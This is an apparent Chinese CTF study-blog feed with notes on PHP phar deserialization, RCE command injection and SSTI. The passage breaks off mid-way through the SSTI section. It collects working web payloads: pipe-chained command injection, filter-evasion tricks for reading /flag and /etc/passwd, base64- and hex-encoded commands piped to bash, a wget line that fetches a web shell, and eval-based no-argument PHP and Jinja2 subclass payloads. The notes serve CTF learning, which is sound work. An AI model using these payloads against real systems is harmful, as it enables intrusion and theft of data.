    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub,有时+一个GIF89a头在前面绕过</span>
    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span>
    <span class="comment">//签名自动计算</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();
<span class="meta">?&gt;</span></code></pre>

<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下</p>
<table>
<thead>
<tr>
<th>受影响函数的列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeab</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/2025/01/21/RCE/</url>
    <content><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
<p><strong>系统命令执行函数</strong></p>
<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
*** passthru() system()的平替，写个命令就会执行命令，自己能回显
*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
$command是要执行的命令。
$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
$pipes是一个引用变量，用于存储与进程相关的管道。
$cwd（可选）是设置子进程的当前工作目录。
$env（可选）是设置子进程的环境变量。
$other_options（可选）是其他选项，如设置超时等
不能直接回显
*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>

<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
<p>那么就需要管道符来支持：</p>
<p>*<strong>关于管道符</strong></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
<p><strong>For Windows：</strong></p>
<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p><strong>For Linux:</strong></p>
<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
<p>发现漏洞后，如何得到控制权呢？</p>
<p>最简单的漏洞就是找到注入点直接注</p>
<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>

<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>

<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>

<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>

<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
<p>%09绕过（相当于Tab键）</p>
<p>%0a–代表换行符</p>
<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
<p>%0d–回车换行</p>
<p>%a0–代表的是非断行空格</p>
<p>%00–%00代表的是ASCII码中的空字符</p>
<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
<p>内联注释绕过知识点</p>
<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
</code></pre>
<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
<pre><code class="highlight plaintext">cat /fl??

cat /f*  #多个匹配结果同时展现</code></pre>

<p>以上指令等效于<code>cat /flag</code></p>
<h3 id="过滤"><a href="#过滤" class="headerlink" title=";过滤"></a>;过滤</h3><p>利用?&gt;绕过</p>
<h3 id="过滤-1"><a href="#过滤-1" class="headerlink" title="&#x2F;过滤"></a>&#x2F;过滤</h3><p>用<code>printf</code> 以及<code>$()</code>绕过</p>
<pre><code class="highlight plaintext">$(printf$&#123;IFS&#125;&quot;\57&quot;)</code></pre>



<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag

c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>

<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>

<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>

<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
<pre><code class="highlight plaintext">cat /fl$9ag

cat /fl$@ag</code></pre>

<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd

cat$x /etc$x/passwd$x

ca$@t /etc$x/passwd$x</code></pre>

<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
<p>echo $PATH              #PATH默认系统环境变量</p>
<p>如果出现：</p>
<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>

<p>则以下代码表示了flag.php</p>
<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>

<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>

<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
<p>执行命令的话有三种形式：</p>
<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash

$(echo Y2FOIGZsYWcucGhw | base64 -d)

`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>

<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>

<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
s = b&quot;tac flag&quot;
h = binascii.b2a_hex(s)
print(h)</code></pre>

<p>tac flag–&gt; 74616320666c6167</p>
<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>

<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>

<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);

?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);

?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>

<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
<p>别的指令也同理</p>
<ul>
<li><p>tac:反向显示，从最后一行开始往前显示</p>
<pre><code class="highlight plaintext">tac /flag</code></pre>


</li>
<li><p>more:一页一页显示档案内容</p>
<pre><code class="highlight plaintext">more flag.php</code></pre>


</li>
<li><p>less：与more类似</p>
</li>
<li><p>tail：查看末尾几行</p>
</li>
<li><p>nl：显示的时候，顺便输出行号</p>
<pre><code class="highlight plaintext">nl /flag</code></pre></li>
</ul>
<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
<ul>
<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
</ul>
<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>

<ul>
<li><p>xxd：读取二进制文件</p>
<pre><code class="highlight plaintext">xxd /flag</code></pre>


</li>
<li><p>sort：主要用于排序文件 </p>
<pre><code class="highlight plaintext">so?t /flag
/usr/bin/s?rt /flag</code></pre></li>
</ul>
<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
<ul>
<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
</ul>
<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
<ul>
<li>strings：<br>相当于cat</li>
</ul>
<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
<p>3.利用cp命令：cp flag.php 1.txt</p>
<p>4.利用mv命令：mv flag.php 1.txt</p>
<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
<p>7.利用wget下载：</p>
<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>

<p>8.dnslog外带数据</p>
<h2 id="都是fakeflag-试试环境变量-proc-self-environ和env指令"><a href="#都是fakeflag-试试环境变量-proc-self-environ和env指令" class="headerlink" title="都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令"></a>都是fakeflag ,试试环境变量&#x2F;proc&#x2F;self&#x2F;environ和env指令</h2><h2 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h2><p>最近打比赛看到一些无参的题目，拿来研究一下</p>
<h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>*scandir()<em>函数可以返回当前目录中的所有文件和目录的列表。通过结合</em>localeconv()<em>和</em>current()*函数，可以构造出一个返回当前目录文件列表的payload。例如：</p>
<pre><code class="highlight plaintext">?exp=var_dump(next(array_reverse(scandir(current(localeconv()))));
localeconv()取出一个.并且利用current()取到.向前一个目录移动，再使用scandir扫当前目录，利用array_reverse和next()进行移动</code></pre>

<p>在这个例子中，**localeconv()<strong>返回一个包含本地数字及货币格式信息的数组，其中第一个元素是*.*，表示当前目录。</strong>current()<strong>函数取出这个*.*，然后传递给</strong>scandir()**函数，最终返回当前目录的文件列表<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">1</a>。</p>
<pre><code class="highlight plaintext">类似的移动指针:
end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动</code></pre>

<p>还有一个方法就是用<code>getcwd()</code>直接模当前路径，<code>scandir()</code>扫，<code>array_flip</code>交换数组的键和值</p>
<p>像这样的，还有很多，网上多的是自己慢慢研究</p>
<pre><code class="highlight plaintext">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
  //查看和读取根目录文件
  //查看和读取根目录文件</code></pre>

<h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p>当请求头中有cookie时，可以使用**session_id()<strong>函数来获取当前会话ID。通过将命令进行十六进制编码，然后使用</strong>hex2bin()**解码，可以实现命令执行。例如：</p>
<pre><code class="highlight plaintext">?exp=eval(hex2bin(session_id(session_start())));
Cookie: PHPSESSID=636174202f666c6167</code></pre>

<p>同时，需要在cookie中设置相应的十六进制编码值</p>
<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>*getallheaders()<em>函数返回当前请求的所有请求头信息。可以在请求头中添加恶意代码，然后使用</em>end()*函数指向最后一个请求头，使其执行。例如：</p>
<pre><code class="highlight plaintext">var_dump(end(getallheaders()));</code></pre>

<p>在数据包最后一行添加一个请求头，例如*sky: phpinfo();<em>，然后</em>end()*函数会指向这个请求头并执行其中的代码。</p>
<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><em>get_defined_vars()<em>函数返回所有定义的变量，包括全局变量</em>$_GET</em>、*$_POST<em>、</em>$_COOKIE*等。可以通过添加多个参数来构造payload。例如：</p>
<pre><code class="highlight plaintext">?a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</code></pre>

<p>这样可以执行**system(‘ls &#x2F;‘)**命令。</p>
<h3 id="chdir-array-rand"><a href="#chdir-array-rand" class="headerlink" title="chdir() &amp; array_rand()"></a>chdir() &amp; array_rand()</h3><p>通过目录遍历来读取文件。例如，使用*getcwd()<em>获取当前目录，然后使用</em>dirname()*列出父目录中的所有文件和目录。</p>
<p><code>array_rand()</code>是随机读取数组中的键值，需要配合<code>array_flip</code>使用，<code>chdir()</code>是规定当前的工作目录</p>
<p>例如：</p>
<pre><code class="highlight plaintext">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre>

]]></content>
      <tags>
        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI漏洞</title>
    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="SSTI-模板注入-漏洞"><a href="#SSTI-模板注入-漏洞" class="headerlink" title="SSTI(模板注入)漏洞"></a>SSTI(模板注入)漏洞</h1><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h2 id="模板注入漏洞"><a href="#模板注入漏洞" class="headerlink" title="模板注入漏洞"></a>模板注入漏洞</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的<code>flask</code>，php的<code>tp</code>，java的<code>spring</code>等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入(一般来说是用户输入的变量)以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h2 id="确定漏洞"><a href="#确定漏洞" class="headerlink" title="确定漏洞"></a>确定漏洞</h2><p>贴个图</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti.png" alt="ssti"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti2.png" alt="ssti2"></p>
<h3 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h3><ul>
<li>如果可以执行${7*7}的结果，那我们进入第二层的<code>a&#123;*comment*&#125;b</code>，如果没用执行结果，那就进入第二层的<code>&#123;&#123;7*7&#125;&#125;</code></li>
<li>在Mako模板引擎中我们也是${}形式的</li>
</ul>
<h3 id="第二层："><a href="#第二层：" class="headerlink" title="第二层："></a>第二层：</h3><ul>
<li>在<code>a&#123;*comment*&#125;b</code>中，如果{**}被当作注释而输出ab，我们就可以确定这个地方是Smarty模板，如果不能，进入第三层；</li>
<li>在<code>&#123;&#123;7*7&#125;&#125;</code>中，如果能够执行，那我们进入第三层。</li>
</ul>
<h3 id="第三层："><a href="#第三层：" class="headerlink" title="第三层："></a>第三层：</h3><ul>
<li>当49的结果为49时，对应着Twig模板类型，而结果如果为7777777，则对应着Jinja2的模板类型</li>
<li>当能够执行<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,我们就能确定是Mako模板，能够直接执行python命令.</li>
</ul>
<p>接下来就进入不同模板的不同注入方式</p>
<h2 id="Python模板注入"><a href="#Python模板注入" class="headerlink" title="Python模板注入"></a>Python模板注入</h2><h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><p>python的一种主流模板，基本你看到页面在输入后会实时回显在页面并且发包后看出语言是python基本就能确认是</p>
<pre><code class="highlight plaintext">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>

<p>这里先简单介绍一下jinja2的语法好了</p>
<h4 id="语法结构"><a href="#语法结构" class="headerlink" title="语法结构"></a>语法结构</h4><p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取</p>
<p>Jinja2 模板同样支持控制语句，像在 <code>&#123;%…%&#125; </code>块中，下面举一个常见的使用Jinja2模板引擎for语句循环渲染一组元素的例子:</p>
<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
         <li>&#123;&#123;comment&#125;&#125;</li>
    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
<p>另外Jinja2 能识别所有类型的变量，甚至是一些复杂的类型，例如列表、字典和对象。此外，还可使用过滤器修改变量，过滤器名添加在变量名之后，中间使用竖线分隔。例如，下述模板以首字母大写形式显示变量name的值</p>
<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>

<p>但是这只能在渲染前的模板中进行注入，如果模板已经渲染，就不存在模板注入了:</p>
<pre><code class="highlight plaintext">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)

    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
    return t.render(n=name)

if __name__ == &quot;__main__&quot;:
    app.run()</code></pre>

<p>编译运行，再次注入就会失败<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
<pre><code class="highlight plaintext">&#123;% ... %&#125; for Statements #用来声明变量，也可以用于条件语句和循环语句
例子:
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__==&#x27;file&#x27; %&#125;
&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;
 
&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #将表达式打印到模板输出
 
&#123;# ... #&#125; for Comments not included in the template output #表示未包含在模板输出中的注释
 
#...# for Line Statements #有和&#123;%%&#125;相同的效果</code></pre>

<p>有些时候过滤可能会ban掉双括号，这时候可能就需要用到上面的一些语法</p>
<h4 id="jinja2的俄罗斯套娃"><a href="#jinja2的俄罗斯套娃" class="headerlink" title="jinja2的俄罗斯套娃"></a>jinja2的俄罗斯套娃</h4><p>看过jinja2相关模板注入题目的人就能明白是什么意思了哈哈()</p>
<p>介绍一下基类的一些概念之类的吧</p>
<p><code>&#39;&#39; [] ()</code>都是最简单的数据类型，而我们最一般的思路就是通过这些来找到基类，这里就要涉及到一些魔术方法了</p>
<p>那就按顺序进行一个介绍吧</p>
<p>首先，我们的目的是要找到基类</p>
<p>于是我们就要用到<code>__class__</code>返回一个实例所属的类</p>
<p>但是我们的目的是找到Object基类，那么我们需要进一步返回</p>
<p>所以就要用到<code>__base__ __bases__  __mro__</code></p>
